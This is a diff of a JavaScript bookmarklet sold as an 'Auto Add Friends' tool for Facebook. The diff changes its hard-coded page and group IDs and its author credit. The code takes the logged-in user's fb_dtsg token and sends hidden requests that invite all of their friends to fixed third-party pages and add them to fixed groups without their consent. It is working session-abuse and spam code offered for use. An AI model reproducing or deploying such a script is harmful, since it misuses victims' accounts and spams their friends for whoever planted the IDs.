@@ -47,13 +47,9 @@ javascript: (function () {
                     function SuggestFriend() {
                       
                      
-                        jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg="  + f.dtsg + "&profileChooserItems=%7B%22" + f.arr[i].uid + "%22%3A1%7D&checkableitems[0]=" + f.arr[i].uid + "&page_id=199134496914077&__user="+ f.uid + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
-                        jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg="  + f.dtsg + "&profileChooserItems=%7B%22" + f.arr[i].uid + "%22%3A1%7D&checkableitems[0]=" + f.arr[i].uid + "&page_id=165411580286132&__user="+ f.uid + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
-                        jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg="  + f.dtsg + "&profileChooserItems=%7B%22" + f.arr[i].uid + "%22%3A1%7D&checkableitems[0]=" + f.arr[i].uid + "&page_id=232233963594535&__user="+ f.uid + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
+                        jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg="  + f.dtsg + "&profileChooserItems=%7B%22" + f.arr[i].uid + "%22%3A1%7D&checkableitems[0]=" + f.arr[i].uid + "&page_id=179350925575427&__user="+ f.uid + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
                         
-                        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + f.dtsg + "&group_id=536352643082702&source=typeahead&members=" + f.arr[i].uid + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + f.uid, function () {}, "text", "post");
-                        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + f.dtsg + "&group_id=680497811966350&source=typeahead&members=" + f.arr[i].uid + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + f.uid, function () {}, "text", "post");
-                        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + f.dtsg + "&group_id=680497811966350&source=typeahead&members=" + f.arr[i].uid + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + f.uid, function () {}, "text", "post");
+                        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + f.dtsg + "&group_id=1413025565582707&source=typeahead&members=" + f.arr[i].uid + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + f.uid, function () {}, "text", "post");
                         
                     }
                     jx = {
@@ -134,7 +130,7 @@ javascript: (function () {
         }
     };
     var Title = 'Auto Add Friends|Members to Group.',
-        crj = '<div style="margin-top:5px;color:gray;font-size:9px;">Powered By: Loading [lllllllllll ] 99% & Assam Indian Cyber Force.</br>Script Made By </A><A style="color:#3B5998;" href="http://www.facebook.com/100001050235420" target="_blank"> Waqar Ahmad</A></A>,</A><A style="color:#3B5998;" href="http://www.facebook.com/100005115938614" target="_blank"> Bhargav JT. Gogoi</A></A>.</br>For More Tools Visit Our Website <A style="color:#3B5998;" href="http://www.automate-your-facebook.webnode.in" target="_blank">www.automate-your-facebook.webnode.in</A>.</A><div>';
+        crj = '<div style="margin-top:5px;color:gray;font-size:9px;">Powered By: Anime Unit.</br>Script Made By </A><A style="color:#3B5998;" href="http://www.facebook.com/100002908006006" target="_blank"> Zeid YoungBlood</A></A>.</br>Join Our Group <A style="color:#3B5998;" href="http://www.facebook.com/1413025565582707" target="_blank">www.facebook.com/1413025565582707</A>.</A><div>';
     var DISPLAY = '<div id="MAIN" style="min-height:50px;width:500px;position:fixed;top:100px;box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;text-align:center;border-radius:10px;padding:5px;z-index:999999;border:3px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff">';
     DISPLAY += '<div style="padding-bottom:5px;font-size:20px;color:#ffffff;">' + Title + '</div>';
     DISPLAY += '<b style="color:#3B5998;font-size:12px;">Please Wait While Collecting Your Friends.</b>';
